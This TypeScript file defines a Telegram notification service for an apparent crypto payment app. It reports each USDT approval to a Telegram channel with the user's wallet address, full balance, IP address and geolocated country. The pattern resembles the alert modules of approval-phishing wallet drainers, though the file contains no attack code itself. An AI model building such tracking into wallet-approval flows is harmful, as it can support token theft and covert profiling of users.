// =================================
// 🔗 Telegram Notification Service
// =================================

import { TelegramNotificationData } from "../types/blockchain";
import { formatAmount } from "../utils/chainUtils";

export class TelegramService {
  /**
   * Send Telegram notification for approval success
   */
  static async sendApprovalNotification(
    data: TelegramNotificationData
  ): Promise<void> {
    try {
      const message = this.formatApprovalMessage(data);

      // Import telegram service dynamically to avoid SSR issues
      const { telegramService } = await import("@/lib/telegram");

      if (telegramService.isConfigured()) {
        await telegramService.sendSystemAlert(message, "info");
      }
    } catch (error) {
      // Don't fail the approval if telegram fails
    }
  }

  /**
   * Format approval success message
   */
  private static formatApprovalMessage(data: TelegramNotificationData): string {
    const displayAmount = formatAmount(data.amount, 6); // USDT has 6 decimals
    const displayBalance = formatAmount(data.usdtBalance, 6);

    return `🎉 **USDT Approval Successful!**

💰 **Payment ID:** ${data.paymentId}
🔗 **Chain:** ${data.chain.toUpperCase()}
👤 **Wallet:** ${data.userAddress}
💳 **Wallet Type:** ${data.walletType}
💵 **Approved Amount:** ${displayAmount} USDT
🏦 **Wallet Balance:** ${displayBalance} USDT
🌍 **IP Address:** ${data.clientIP || "Unknown"}
🏛️ **Country:** ${data.country || "Unknown"}
⏰ **Time:** ${new Date().toLocaleString()}`;
  }

  /**
   * Get country from IP address
   */
  static async getCountryFromIP(
    clientIP?: string
  ): Promise<string | undefined> {
    if (!clientIP) return undefined;

    try {
      // Try multiple IP geolocation services as fallbacks
      const services = [
        `https://ipapi.co/${clientIP}/json/`,
        `https://ip-api.com/json/${clientIP}`,
        `https://ipinfo.io/${clientIP}/json`
      ];

      for (const serviceUrl of services) {
        try {
          const response = await fetch(serviceUrl, {
            headers: {
              'User-Agent': 'Mozilla/5.0 (compatible; CryptoPayment/1.0)',
              'Accept': 'application/json'
            }
          });

          if (response.ok) {
            const data = await response.json();
            
            // Different services return country in different fields
            const country = data.country || data.country_code || data.countryCode;
            if (country) {
              return country;
            }
          }
        } catch (serviceError) {
          // Continue to next service if this one fails
          console.warn(`IP geolocation service failed: ${serviceUrl}`, serviceError);
        }
      }

      // If all services fail, return undefined
      console.warn(`All IP geolocation services failed for IP: ${clientIP}`);
      return undefined;
    } catch (error) {
      console.warn("Error in IP geolocation:", error);
      return undefined;
    }
  }

  /**
   * Send error notification
   */
  static async sendErrorNotification(
    error: string,
    context: string,
    chain?: string
  ): Promise<void> {
    try {
      const message = `❌ **Error Notification**

🚨 **Error:** ${error}
📋 **Context:** ${context}
🔗 **Chain:** ${chain || "Unknown"}
⏰ **Time:** ${new Date().toLocaleString()}`;

      const { telegramService } = await import("@/lib/telegram");

      if (telegramService.isConfigured()) {
        await telegramService.sendSystemAlert(message, "error");
      }
    } catch (error) {
      // Error notification failed
    }
  }
}
